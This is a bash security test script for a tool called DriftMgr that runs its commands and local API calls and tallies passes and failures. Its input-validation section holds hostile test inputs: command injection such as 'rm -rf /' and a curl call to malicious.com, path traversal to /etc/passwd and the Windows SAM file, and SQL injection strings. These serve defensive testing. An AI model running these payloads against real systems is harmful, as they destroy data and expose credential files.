#!/bin/bash

# DriftMgr Security Test Runner
# This script runs security-focused tests to ensure DriftMgr is secure

set -e

echo "🔒 Starting DriftMgr Security Tests"
echo "=================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Test counter
PASSED=0
FAILED=0

# Function to run a test and report results
run_test() {
    local test_name="$1"
    local test_command="$2"
    
    echo -e "\n${YELLOW}Testing: ${test_name}${NC}"
    echo "Command: $test_command"
    
    if eval "$test_command" > /dev/null 2>&1; then
        echo -e "${GREEN}✓ PASS: ${test_name}${NC}"
        ((PASSED++))
    else
        echo -e "${RED}✗ FAIL: ${test_name}${NC}"
        ((FAILED++))
    fi
}

# Function to run a test that should fail (security test)
run_security_test() {
    local test_name="$1"
    local test_command="$2"
    
    echo -e "\n${YELLOW}Security Test: ${test_name}${NC}"
    echo "Command: $test_command"
    
    if eval "$test_command" > /dev/null 2>&1; then
        echo -e "${RED}✗ SECURITY FAILURE: ${test_name} - Command succeeded when it should have failed${NC}"
        ((FAILED++))
    else
        echo -e "${GREEN}✓ SECURITY PASS: ${test_name} - Command properly rejected${NC}"
        ((PASSED++))
    fi
}

echo -e "\n${YELLOW}1. Input Validation and Sanitization Tests${NC}"

# Command injection prevention tests
run_security_test "Command Injection - discover" "./bin/driftmgr.exe discover 'aws; rm -rf /'"
run_security_test "Command Injection - analyze" "./bin/driftmgr.exe analyze 'terraform; cat /etc/passwd'"
run_security_test "Command Injection - remediate" "./bin/driftmgr.exe remediate 'example; \$(curl http://malicious.com)'"

# Path traversal prevention tests
run_security_test "Path Traversal - analyze" "./bin/driftmgr.exe analyze '../../../etc/passwd'"
run_security_test "Path Traversal - export" "./bin/driftmgr.exe export '..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam'"
run_security_test "Path Traversal - statefiles" "./bin/driftmgr.exe statefiles '..%2f..%2f..%2fetc%2fpasswd'"

# SQL injection prevention tests
run_security_test "SQL Injection - credentials" "./bin/driftmgr.exe credentials \"'; DROP TABLE users; --\""
run_security_test "SQL Injection - analyze" "./bin/driftmgr.exe analyze \"'; SELECT * FROM sensitive_data; --\""

echo -e "\n${YELLOW}2. Authentication and Authorization Tests${NC}"

# Credential validation tests
run_test "Credential Validation - AWS" "./bin/driftmgr.exe credentials validate aws"
run_test "Credential Validation - Azure" "./bin/driftmgr.exe credentials validate azure"
run_test "Credential Validation - GCP" "./bin/driftmgr.exe credentials validate gcp"

# Access control tests
run_test "Access Control - Dry Run" "./bin/driftmgr.exe discover aws all --dry-run"
run_security_test "Access Control - Force Critical" "./bin/driftmgr.exe remediate critical --force"

echo -e "\n${YELLOW}3. Data Protection Tests${NC}"

# Sensitive data handling tests
run_test "Sensitive Data - Debug Mode" "./bin/driftmgr.exe discover aws all --debug"
run_test "State Encryption" "./bin/driftmgr.exe analyze terraform --encrypt-state"
run_test "Output Encryption" "./bin/driftmgr.exe export aws --encrypt-output"

echo -e "\n${YELLOW}4. Network Security Tests${NC}"

# API security tests
run_test "API Health Check" "curl -X GET http://localhost:8080/api/v1/health"
run_test "API Discovery Endpoint" "curl -X POST http://localhost:8080/api/v1/discover -H 'Content-Type: application/json' -d '{\"provider\":\"aws\"}'"
run_test "API Resources Endpoint" "curl -X GET http://localhost:8080/api/v1/resources"

# CORS configuration test
run_security_test "CORS Configuration" "curl -H 'Origin: http://malicious.com' http://localhost:8080/api/v1/health"

echo -e "\n${YELLOW}5. TLS/SSL Configuration Tests${NC}"

# TLS configuration tests (if certificates exist)
if [ -f "test.crt" ] && [ -f "test.key" ]; then
    run_test "TLS Configuration" "./bin/driftmgr.exe --enable-tls --cert-file=test.crt --key-file=test.key"
    run_test "HTTPS Health Check" "curl -k https://localhost:8080/api/v1/health"
else
    echo -e "${YELLOW}⚠ TLS test certificates not found, skipping TLS tests${NC}"
fi

echo -e "\n${YELLOW}6. Audit Logging Tests${NC}"

# Audit logging tests
run_test "Audit Logging - Discovery" "./bin/driftmgr.exe discover aws us-east-1"
run_test "Audit Logging - Analysis" "./bin/driftmgr.exe analyze terraform"
run_test "Audit Logging - Remediation" "./bin/driftmgr.exe remediate example --generate"

# Check if logs were created
if [ -d "logs" ] && [ "$(ls -A logs)" ]; then
    echo -e "${GREEN}✓ PASS: Audit logs created${NC}"
    ((PASSED++))
else
    echo -e "${RED}✗ FAIL: No audit logs found${NC}"
    ((FAILED++))
fi

echo -e "\n${YELLOW}7. Configuration Security Tests${NC}"

# Configuration file security tests
run_test "Config File Loading" "./bin/driftmgr.exe --config=./config/config.yaml"
run_test "Environment Variables" "DRIFT_CLIENT_TIMEOUT=60s ./bin/driftmgr.exe discover aws us-east-1"

echo -e "\n${YELLOW}8. Error Handling Security Tests${NC}"

# Error handling tests
run_test "Network Failure Recovery" "./bin/driftmgr.exe discover aws all --retry-attempts=5"
run_test "Partial Failure Recovery" "./bin/driftmgr.exe discover aws all --continue-on-error"

echo -e "\n${YELLOW}9. Compliance Tests${NC}"

# Compliance tests
run_test "GDPR Compliance" "./bin/driftmgr.exe discover aws all --gdpr-compliant"
run_test "Data Anonymization" "./bin/driftmgr.exe export aws --anonymize-data"
run_test "SOX Compliance" "./bin/driftmgr.exe analyze terraform --sox-compliant"
run_test "Audit Trail" "./bin/driftmgr.exe remediate terraform --audit-trail"

echo -e "\n${YELLOW}10. Security Policy Tests${NC}"

# Security policy tests
run_test "Security Scan" "./bin/driftmgr.exe discover aws all --security-scan"
run_test "Policy Check" "./bin/driftmgr.exe analyze terraform --policy-check"
run_test "Policy Enforcement" "./bin/driftmgr.exe remediate terraform --policy-enforcement"

echo -e "\n${YELLOW}11. Monitoring and Alerting Security Tests${NC}"

# Monitoring tests
run_test "Health Monitoring" "./bin/driftmgr.exe health --detailed"
run_test "Metrics Collection" "./bin/driftmgr.exe health --metrics"

# Alerting tests
run_test "Slack Notifications" "./bin/driftmgr.exe notify drift-detected --channel=slack"
run_test "Email Notifications" "./bin/driftmgr.exe notify critical-drift --channel=email"
run_test "Webhook Notifications" "./bin/driftmgr.exe notify remediation-complete --channel=webhook"

echo -e "\n${YELLOW}12. Documentation and Help Security Tests${NC}"

# Help system tests
run_test "Main Help" "./bin/driftmgr.exe --help"
run_test "Discover Help" "./bin/driftmgr.exe discover --help"
run_test "Analyze Help" "./bin/driftmgr.exe analyze --help"
run_test "Remediate Help" "./bin/driftmgr.exe remediate --help"

echo -e "\n${YELLOW}13. Interactive Mode Security Tests${NC}"

# Interactive mode tests
run_test "Interactive Shell" "echo 'exit' | ./bin/driftmgr.exe"
run_test "Command History" "echo 'discover aws us-east-1' | ./bin/driftmgr.exe"

echo -e "\n${YELLOW}14. Specific Issue Resolution Security Tests${NC}"

# Fix specific issues from trial run
run_test "Cache Integration Fix" "go test ./tests/integration/... -v -run TestCacheIntegration"
run_test "Worker Pool Integration Fix" "go test ./tests/integration/... -v -run TestWorkerPoolIntegration"

# Visualization security tests (after fixing JSON parsing)
run_test "Diagram Generation Security" "./bin/driftmgr.exe diagram aws --debug"
run_test "Visualization Security" "./bin/driftmgr.exe visualize aws --debug"

echo -e "\n${YELLOW}15. Performance Security Tests${NC}"

# Performance and resource limit tests
run_test "Memory Limit" "./bin/driftmgr.exe discover aws all --memory-limit=2GB"
run_test "CPU Limit" "./bin/driftmgr.exe analyze terraform --cpu-limit=4"
run_test "Concurrency Limit" "./bin/driftmgr.exe discover aws all --concurrency=10"

echo -e "\n${YELLOW}16. Cross-Platform Security Tests${NC}"

# Cross-platform compatibility tests
run_test "Windows Compatibility" "./bin/driftmgr.exe discover aws us-east-1"
run_test "Linux Compatibility" "./bin/driftmgr.exe analyze terraform"

echo -e "\n${YELLOW}17. Automated Test Suite Security${NC}"

# Automated test suite
run_test "Unit Test Coverage" "go test ./tests/unit/... -v -cover"
run_test "Race Condition Tests" "go test ./tests/unit/... -v -race"
run_test "Benchmark Tests" "go test ./tests/unit/... -v -bench=."
run_test "Integration Tests" "go test ./tests/integration/... -v"

echo -e "\n${YELLOW}18. Final Security Validation${NC}"

# Final validation tests
run_test "Complete Workflow Security" "./bin/driftmgr.exe discover aws us-east-1 && ./bin/driftmgr.exe analyze terraform && ./bin/driftmgr.exe remediate example --generate"
run_test "Server Security" "curl -X GET http://localhost:8080/api/v1/health"
run_test "Client Security" "./bin/driftmgr.exe health"

echo -e "\n${YELLOW}========================================${NC}"
echo -e "${YELLOW}Security Test Results Summary${NC}"
echo -e "${YELLOW}========================================${NC}"
echo -e "${GREEN}Tests Passed: ${PASSED}${NC}"
echo -e "${RED}Tests Failed: ${FAILED}${NC}"
echo -e "${YELLOW}Total Tests: $((PASSED + FAILED))${NC}"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}🎉 All security tests passed! DriftMgr appears to be secure.${NC}"
    exit 0
else
    echo -e "\n${RED}[WARNING]  ${FAILED} security test(s) failed. Please review and fix the issues.${NC}"
    exit 1
fi
